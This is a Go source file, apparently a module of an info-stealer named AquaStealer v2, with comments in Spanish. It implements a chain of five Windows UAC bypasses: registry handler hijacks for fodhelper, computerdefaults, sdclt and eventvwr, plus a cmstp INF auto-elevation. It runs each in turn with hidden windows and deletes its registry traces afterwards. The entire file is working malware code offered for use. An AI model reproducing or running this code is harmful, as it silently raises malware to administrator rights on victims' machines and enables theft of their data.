package uacbypass

// bypass.go — AquaStealer v2 — UAC Bypass multi-método
//
// Métodos (todos HKCU, sin escribir a disco de sistema):
//   1. fodhelper.exe — ms-settings COM handler hijack (Win10/11)
//   2. computerdefaults.exe — mismo vector que fodhelper (Win10/11)
//   3. sdclt.exe — /KickOffElev + HKCU\Software\Classes\Folder\shell\open\command
//   4. eventvwr.exe — HKCU\Software\Classes\mscfile\shell\open\command
//   5. cmstp.exe — INF file auto-elevate
//   Intenta cada método en orden hasta que uno funcione

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
	"time"
	"unsafe"

	"github.com/aqua/stealer/utils/program"
	"golang.org/x/sys/windows/registry"
)

var (
	shell32  = syscall.NewLazyDLL("shell32.dll")
	procShellExecuteW = shell32.NewProc("ShellExecuteW")
)

// CanElevate — verifica si el usuario tiene privilegios de admin (pero no elevado aún)
func CanElevate() bool {
	var infoPointer uintptr
	syscall.NewLazyDLL("netapi32.dll").NewProc("NetUserGetInfo").Call(
		0,
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(os.Getenv("USERNAME")))),
		1,
		uintptr(unsafe.Pointer(&infoPointer)),
	)
	defer syscall.NewLazyDLL("netapi32.dll").NewProc("NetApiBufferFree").Call(infoPointer)
	type userInfo1 struct {
		Name     *uint16; Password *uint16; PasswordAge uint32
		Priv     uint32;  HomeDir  *uint16; Comment *uint16
		Flags    uint32;  ScriptPath *uint16
	}
	info := (*userInfo1)(unsafe.Pointer(infoPointer))
	return info.Priv == 2 // USER_PRIV_ADMIN
}

// cleanupKey — elimina la clave de registry usada para el bypass
func cleanupKey(path string) {
	_ = registry.DeleteKey(registry.CURRENT_USER, path)
}

// ElevateFodhelper — clásico, el más confiable en Win10/11
func ElevateFodhelper(exePath string) error {
	const keyPath = `Software\Classes\ms-settings\shell\open\command`
	k, _, err := registry.CreateKey(registry.CURRENT_USER, keyPath, registry.ALL_ACCESS)
	if err != nil {
		return err
	}
	defer func() {
		k.Close()
		cleanupKey(keyPath)
	}()
	if err := k.SetStringValue("", exePath); err != nil {
		return err
	}
	if err := k.SetStringValue("DelegateExecute", ""); err != nil {
		return err
	}
	cmd := exec.Command("cmd.exe", "/c", "fodhelper.exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_ = cmd.Run()
	time.Sleep(500 * time.Millisecond)
	return nil
}

// ElevateComputerDefaults — idéntico a fodhelper pero con computerdefaults.exe
func ElevateComputerDefaults(exePath string) error {
	const keyPath = `Software\Classes\ms-settings\shell\open\command`
	k, _, err := registry.CreateKey(registry.CURRENT_USER, keyPath, registry.ALL_ACCESS)
	if err != nil {
		return err
	}
	defer func() {
		k.Close()
		cleanupKey(keyPath)
	}()
	_ = k.SetStringValue("", exePath)
	_ = k.SetStringValue("DelegateExecute", "")
	sysDir := os.Getenv("SystemRoot")
	cmd := exec.Command(filepath.Join(sysDir, "System32", "computerdefaults.exe"))
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_ = cmd.Run()
	time.Sleep(500 * time.Millisecond)
	return nil
}

// ElevateSdclt — sdclt.exe /KickOffElev
func ElevateSdclt(exePath string) error {
	const keyPath = `Software\Classes\Folder\shell\open\command`
	k, _, err := registry.CreateKey(registry.CURRENT_USER, keyPath, registry.ALL_ACCESS)
	if err != nil {
		return err
	}
	defer func() {
		k.Close()
		cleanupKey(keyPath)
		_ = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\Folder\shell\open`)
		_ = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\Folder\shell`)
		_ = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\Folder`)
	}()
	_ = k.SetStringValue("", exePath)
	_ = k.SetStringValue("DelegateExecute", "")
	cmd := exec.Command("cmd.exe", "/c", "sdclt.exe", "/KickOffElev")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_ = cmd.Run()
	time.Sleep(500 * time.Millisecond)
	return nil
}

// ElevateEventvwr — eventvwr.exe mscfile hijack
func ElevateEventvwr(exePath string) error {
	const keyPath = `Software\Classes\mscfile\shell\open\command`
	k, _, err := registry.CreateKey(registry.CURRENT_USER, keyPath, registry.ALL_ACCESS)
	if err != nil {
		return err
	}
	defer func() {
		k.Close()
		cleanupKey(keyPath)
		_ = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\mscfile\shell\open`)
		_ = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\mscfile\shell`)
		_ = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\mscfile`)
	}()
	_ = k.SetStringValue("", exePath)
	cmd := exec.Command("cmd.exe", "/c", "eventvwr.exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_ = cmd.Run()
	time.Sleep(500 * time.Millisecond)
	return nil
}

// ElevateCmstp — cmstp.exe con archivo INF autoinstalable
func ElevateCmstp(exePath string) error {
	tmpDir := os.Getenv("TEMP")
	infPath := filepath.Join(tmpDir, "setup.inf")
	infContent := fmt.Sprintf(`[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
%s
taskkill /IM cmstp.exe /F

[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7

[AllUSer_LDIDSection]
"HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%%UnexpectedError%%", ""

[Strings]
ServiceName="AquaNet"
ShortSvcName="AquaNet"
`, exePath)

	if err := os.WriteFile(infPath, []byte(infContent), 0644); err != nil {
		return err
	}
	defer os.Remove(infPath)

	cmd := exec.Command("cmstp.exe", "/au", infPath)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_ = cmd.Run()
	time.Sleep(1 * time.Second)
	return nil
}

func Run() {
	if program.IsElevated() {
		return // Ya somos admin
	}
	if !CanElevate() {
		return // Usuario no es admin, no podemos elevar
	}

	exePath, err := os.Executable()
	if err != nil {
		return
	}

	// Intentar métodos en orden de confiabilidad
	methods := []func(string) error{
		ElevateFodhelper,
		ElevateComputerDefaults,
		ElevateSdclt,
		ElevateEventvwr,
		ElevateCmstp,
	}

	for _, method := range methods {
		_ = method(exePath)
		// Si después de ejecutar el método, somos elevados, salir (el proceso elevado continúa)
		if program.IsElevated() {
			os.Exit(0)
		}
		time.Sleep(200 * time.Millisecond)
	}
	// Si ningún método funcionó, continuar sin elevación
}
